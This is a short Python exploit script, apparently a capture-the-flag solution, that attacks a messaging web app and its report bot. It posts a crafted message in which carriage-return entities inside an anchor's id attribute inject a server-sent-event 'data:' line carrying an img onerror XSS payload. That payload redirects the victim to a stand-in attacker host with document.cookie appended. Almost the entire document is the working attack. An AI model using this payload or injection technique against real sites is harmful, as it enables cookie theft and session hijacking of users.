import requests
import threading
import time
import os

URL = os.environ.get("URL", "http://localhost:3000/")
BOT = os.environ.get("BOT", "http://localhost:1337/")
CONNECTBACK_URL = os.environ.get("CONNECTBACK_URL", "http://attacker/")


s = requests.session()

r = s.post(f"{BOT}api/report")

uuid = r.text[26:].strip()

r = s.get(f"{URL}")

def receiver():
    with s.get(f"{URL}api/events", stream=True) as r:
        for line in r.iter_lines():
            print("Event", line)

t = threading.Thread(target=receiver)
t.start()

time.sleep(0.5)

js = f"location=`{CONNECTBACK_URL}?`+document.cookie"

r = s.post(f"{URL}api/send-message", json={
    "message": f'''<a id="a&#13;&#13;data:<img src='X' onerror='{js}'>">a</a>''',
    "to": uuid
})
